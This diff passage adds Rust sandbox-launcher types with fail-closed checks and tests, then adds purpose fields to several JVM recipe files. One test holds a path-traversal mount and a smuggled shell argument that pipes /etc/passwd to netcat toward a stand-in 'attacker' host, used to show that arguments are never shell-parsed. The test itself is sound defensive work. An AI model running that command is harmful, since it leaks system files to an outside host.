+    pub fn limits(&self) -> &SandboxLimits {
+        &self.limits
+    }
+}
+
+/// Fully validated untrusted-process request. Arguments remain literal atoms.
+#[derive(Clone, Debug, PartialEq, Eq)]
+pub struct SandboxRequest {
+    /// Boot-authorized executable identity.
+    pub program: ProgramRef,
+    /// Literal, unsplit argument atoms.
+    pub argv: Vec<ArgAtom>,
+    /// Empty-by-default exact environment.
+    pub environment: SealedBindings,
+    /// Bounded standard input.
+    pub stdin: Vec<u8>,
+    /// Validated complete sandbox policy.
+    pub policy: SandboxPolicy,
+}
+impl SandboxRequest {
+    /// Validates and creates a sandbox request.
+    pub fn new(
+        program: ProgramRef,
+        argv: Vec<ArgAtom>,
+        environment: SealedBindings,
+        stdin: Vec<u8>,
+        policy: SandboxPolicy,
+    ) -> Result<Self> {
+        if stdin.len() > policy.limits.stdin_bytes {
+            return Err(Error::Eval("sandbox stdin exceeds policy".into()));
+        }
+        Ok(Self {
+            program,
+            argv,
+            environment,
+            stdin,
+            policy,
+        })
+    }
+}
+
+/// Evidence for one requested control; only launchers may assert `achieved`.
+#[derive(Clone, Debug, PartialEq, Eq)]
+pub struct SandboxEvidence {
+    /// Requested control.
+    pub control: SandboxControl,
+    /// True only when backed by launcher evidence.
+    pub achieved: bool,
+    /// Non-secret operational proof.
+    pub detail: String,
+}
+/// Requested-versus-achieved report plus every operational limit event.
+#[derive(Clone, Debug, PartialEq, Eq)]
+pub struct SandboxReport {
+    /// Registered launcher identity.
+    pub launcher: String,
+    /// Requested-versus-achieved control evidence.
+    pub controls: Vec<SandboxEvidence>,
+    /// Resource hits and truncations.
+    pub limit_hits: Vec<String>,
+    /// Process-tree cleanup evidence.
+    pub cleanup: String,
+}
+impl SandboxReport {
+    /// Returns whether every required control has positive, non-empty evidence.
+    pub fn proves_required(&self, policy: &SandboxPolicy) -> bool {
+        policy.requirements.iter().all(|(control, requirement)| {
+            *requirement != SandboxRequirement::Required
+                || self
+                    .controls
+                    .iter()
+                    .any(|e| e.control == *control && e.achieved && !e.detail.is_empty())
+        })
+    }
+}
+/// Bounded process output paired with launcher-supplied sandbox evidence.
+#[derive(Clone, Debug, PartialEq, Eq)]
+pub struct SandboxResult {
+    /// Bounded standard output.
+    pub stdout: Vec<u8>,
+    /// Bounded standard error.
+    pub stderr: Vec<u8>,
+    /// Exit status or -1 when unavailable.
+    pub exit_code: i32,
+    /// Auditable control and resource evidence.
+    pub report: SandboxReport,
+}
+/// A fail-closed refusal or unprovable launch outcome.
+#[derive(Clone, Debug, PartialEq, Eq)]
+pub struct SandboxRefusal {
+    /// Selected launcher identity.
+    pub launcher: String,
+    /// Bounded refusal reason.
+    pub reason: String,
+    /// Partial evidence, only when execution reached control realization.
+    pub report: Option<SandboxReport>,
+}
+/// Exhaustive result of asking a sandbox launcher to execute a request.
+#[derive(Clone, Debug, PartialEq, Eq)]
+pub enum SandboxAttempt {
+    /// Completed with a report.
+    Completed(SandboxResult),
+    /// Proven not dispatched.
+    Refused(SandboxRefusal),
+    /// Timeout or cancellation with proven cleanup.
+    Stopped(SandboxReport),
+    /// Dispatched but final state is not provable.
+    Unknown(SandboxRefusal),
+}
+
+/// Replaceable object-safe untrusted-process authority boundary.
+pub trait SandboxLauncher: Send + Sync {
+    /// Returns the stable boot-registered launcher identity.
+    fn id(&self) -> &str;
+    /// Attempts the request and reports a complete, refusal, stop, or unknown outcome.
+    fn launch(
+        &self,
+        request: &SandboxRequest,
+        cancellation: &ProcessCancellation,
+    ) -> SandboxAttempt;
+}
+/// Boot-built launcher registry; callers select an identity, never a concrete OS type.
+#[derive(Default)]
+pub struct LauncherRegistry(BTreeMap<String, Arc<dyn SandboxLauncher>>);
+impl LauncherRegistry {
+    /// Registers one unique boot-selected launcher.
+    pub fn register(&mut self, launcher: Arc<dyn SandboxLauncher>) -> Result<()> {
+        let id = launcher.id();
+        if id.is_empty() || self.0.contains_key(id) {
+            return Err(Error::Eval("invalid or duplicate sandbox launcher".into()));
+        }
+        self.0.insert(id.into(), launcher);
+        Ok(())
+    }
+    /// Dispatches through the selected launcher without caller type dispatch.
+    pub fn launch(
+        &self,
+        id: &str,
+        request: &SandboxRequest,
+        cancellation: &ProcessCancellation,
+    ) -> SandboxAttempt {
+        self.0.get(id).map_or_else(
+            || {
+                SandboxAttempt::Refused(SandboxRefusal {
+                    launcher: id.into(),
+                    reason: "sandbox launcher is not registered".into(),
+                    report: None,
+                })
+            },
+            |v| v.launch(request, cancellation),
+        )
+    }
+}
+/// Runs an untrusted request and rejects any completion lacking required proof.
+pub fn sandbox_exec(
+    registry: &LauncherRegistry,
+    launcher: &str,
+    request: &SandboxRequest,
+    cancellation: &ProcessCancellation,
+) -> Result<SandboxResult> {
+    match registry.launch(launcher, request, cancellation) {
+        SandboxAttempt::Completed(result) if result.report.proves_required(&request.policy) => {
+            Ok(result)
+        }
+        SandboxAttempt::Completed(_) => Err(Error::HostError(
+            "sandbox launcher claimed completion without required evidence".into(),
+        )),
+        attempt => Err(Error::HostError(format!("sandbox attempt: {attempt:?}"))),
+    }
+}
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+    struct Fake(&'static str);
+    impl SandboxLauncher for Fake {
+        fn id(&self) -> &str {
+            self.0
+        }
+        fn launch(&self, request: &SandboxRequest, _: &ProcessCancellation) -> SandboxAttempt {
+            SandboxAttempt::Completed(SandboxResult {
+                stdout: vec![],
+                stderr: vec![],
+                exit_code: 0,
+                report: SandboxReport {
+                    launcher: self.0.into(),
+                    controls: request
+                        .policy
+                        .requirements
+                        .keys()
+                        .map(|control| SandboxEvidence {
+                            control: *control,
+                            achieved: true,
+                            detail: "fake proof".into(),
+                        })
+                        .collect(),
+                    limit_hits: vec![],
+                    cleanup: "no descendants".into(),
+                },
+            })
+        }
+    }
+    struct Liar;
+    impl SandboxLauncher for Liar {
+        fn id(&self) -> &str {
+            "liar"
+        }
+        fn launch(&self, _: &SandboxRequest, _: &ProcessCancellation) -> SandboxAttempt {
+            SandboxAttempt::Completed(SandboxResult {
+                stdout: vec![],
+                stderr: vec![],
+                exit_code: 0,
+                report: SandboxReport {
+                    launcher: "liar".into(),
+                    controls: vec![],
+                    limit_hits: vec![],
+                    cleanup: String::new(),
+                },
+            })
+        }
+    }
+    fn policy() -> SandboxPolicy {
+        let controls = [
+            SandboxControl::Network,
+            SandboxControl::Mounts,
+            SandboxControl::Root,
+            SandboxControl::Environment,
+            SandboxControl::Identity,
+            SandboxControl::Cpu,
+            SandboxControl::Memory,
+            SandboxControl::WallTime,
+            SandboxControl::ProcessCount,
+            SandboxControl::FileCount,
+            SandboxControl::FileBytes,
+            SandboxControl::Output,
+            SandboxControl::Stdin,
+            SandboxControl::ProcessTree,
+        ];
+        SandboxPolicy::new(
+            controls
+                .into_iter()
+                .map(|c| (c, SandboxRequirement::Required)),
+            vec![],
+            SandboxLimits {
+                cpu_seconds: 1,
+                memory_bytes: 1,
+                wall_time_ms: 1,
+                process_count: 1,
+                file_count: 1,
+                file_bytes: 1,
+                output_bytes: 1,
+                stdin_bytes: 1,
+            },
+        )
+        .unwrap()
+    }
+    #[test]
+    fn registered_launchers_are_dispatch_independent_and_fail_closed() {
+        let request = SandboxRequest::new(
+            ProgramRef::new("tool").unwrap(),
+            vec![],
+            SealedBindings::empty(),
+            vec![],
+            policy(),
+        )
+        .unwrap();
+        let mut registry = LauncherRegistry::default();
+        registry.register(Arc::new(Fake("one"))).unwrap();
+        registry.register(Arc::new(Fake("two"))).unwrap();
+        assert_eq!(
+            sandbox_exec(&registry, "one", &request, &Default::default())
+                .unwrap()
+                .report
+                .launcher,
+            "one"
+        );
+        assert_eq!(
+            sandbox_exec(&registry, "two", &request, &Default::default())
+                .unwrap()
+                .report
+                .launcher,
+            "two"
+        );
+        assert!(sandbox_exec(&registry, "missing", &request, &Default::default()).is_err());
+        registry.register(Arc::new(Liar)).unwrap();
+        assert!(sandbox_exec(&registry, "liar", &request, &Default::default()).is_err());
+    }
+    #[test]
+    fn hostile_paths_stdin_and_arguments_are_validated_without_shell_parsing() {
+        let limits = SandboxLimits {
+            cpu_seconds: 1,
+            memory_bytes: 1,
+            wall_time_ms: 1,
+            process_count: 1,
+            file_count: 1,
+            file_bytes: 1,
+            output_bytes: 1,
+            stdin_bytes: 1,
+        };
+        let controls = [
+            SandboxControl::Network,
+            SandboxControl::Mounts,
+            SandboxControl::Root,
+            SandboxControl::Environment,
+            SandboxControl::Identity,
+            SandboxControl::Cpu,
+            SandboxControl::Memory,
+            SandboxControl::WallTime,
+            SandboxControl::ProcessCount,
+            SandboxControl::FileCount,
+            SandboxControl::FileBytes,
+            SandboxControl::Output,
+            SandboxControl::Stdin,
+            SandboxControl::ProcessTree,
+        ];
+        assert!(
+            SandboxPolicy::new(
+                controls
+                    .into_iter()
+                    .map(|c| (c, SandboxRequirement::Required)),
+                vec![SandboxMount {
+                    source: "input".into(),
+                    guest_path: "/work/../etc".into(),
+                    access: MountAccess::ReadOnly
+                }],
+                limits.clone()
+            )
+            .is_err()
+        );
+        let policy = SandboxPolicy::new(
+            controls
+                .into_iter()
+                .map(|c| (c, SandboxRequirement::Required)),
+            vec![],
+            limits,
+        )
+        .unwrap();
+        assert!(
+            SandboxRequest::new(
+                ProgramRef::new("tool").unwrap(),
+                vec![],
+                SealedBindings::empty(),
+                vec![1, 2],
+                policy.clone()
+            )
+            .is_err()
+        );
+        let atom = ArgAtom::new("; cat /etc/passwd | nc attacker 1").unwrap();
+        let request = SandboxRequest::new(
+            ProgramRef::new("tool").unwrap(),
+            vec![atom],
+            SealedBindings::empty(),
+            vec![],
+            policy,
+        )
+        .unwrap();
+        assert_eq!(
+            request.argv[0].as_str(),
+            "; cat /etc/passwd | nc attacker 1"
+        );
+    }
+}
+// conformance: sandbox policy tests prove sealed authority and fail-closed execution.
 ```
 
 ### `feature/sim-runtime/jvm-loadable-profile`
@@ -13681,6 +14614,7 @@ Source `crates/sim-lib-lang-jvm/recipes/01-basics/authorized-static-call/recipe.
 title = "Define authorized class bytes and call a static method"
 kind = "lisp"
 entry = "setup.siml"
+purpose = "purpose.md"
 ```
 
 Specimen `recipe/sim-runtime/crates/sim-lib-lang-jvm/01-basics/java-lambda` is checked by `sh scripts/check-recipes.sh`.
@@ -13691,6 +14625,7 @@ Source `crates/sim-lib-lang-jvm/recipes/01-basics/java-lambda/recipe.toml`:
 title = "Invoke a compiler-produced Java lambda from SIM"
 kind = "lisp"
 entry = "setup.siml"
+purpose = "purpose.md"
 ```
 
 Specimen `recipe/sim-runtime/crates/sim-lib-lang-jvm/01-basics/method-reference` is checked by `sh scripts/check-recipes.sh`.
@@ -13701,6 +14636,7 @@ Source `crates/sim-lib-lang-jvm/recipes/01-basics/method-reference/recipe.toml`:
 title = "Invoke a Java method reference from SIM"
 kind = "lisp"
 entry = "setup.siml"
+purpose = "purpose.md"
 ```
 
 Specimen `recipe/sim-runtime/crates/sim-lib-lang-jvm/01-basics/sim-functional-interface` is checked by `sh scripts/check-recipes.sh`.
@@ -13711,6 +14647,7 @@ Source `crates/sim-lib-lang-jvm/recipes/01-basics/sim-functional-interface/recip
 title = "Pass an authorized SIM callable to Java"
 kind = "lisp"
 entry = "setup.siml"
+purpose = "purpose.md"
 ```
 
 Specimen `spec-test/sim-runtime/crates/sim-lib-lang-jvm/tests/product_specimen` is checked by `cargo test`.
@@ -13727,7 +14664,11 @@ use sim_lib_lang_jvm::{class_load_capability, jvm_invoke_capability, run_product
 
 #[test]
 fn published_specimen_runs_all_product_cases() {
-    let mut cx = Cx::new(Arc::new(NoopEvalPolicy), Arc::new(DefaultFactory));
+    let mut cx = Cx::new(
+        Arc::new(NoopEvalPolicy),
+        Arc::new(DefaultFactory),
+        sim_kernel::HandleSeed::new(0x4a56_4d01),
+    );
     cx.grant(class_load_capability());
     cx.grant(jvm_invoke_capability());
     let report = run_product_specimen(&mut cx).unwrap();
@@ -14201,6 +15142,7 @@ Source `crates/sim-lib-lang-jvm/recipes/01-basics/performance-evidence/recipe.to
 title = "Inspect prepared JVM performance evidence"
 kind = "lisp"
 entry = "setup.siml"
+purpose = "purpose.md"
 ```
 
 ### `feature/sim-runtime/guarded-operations`
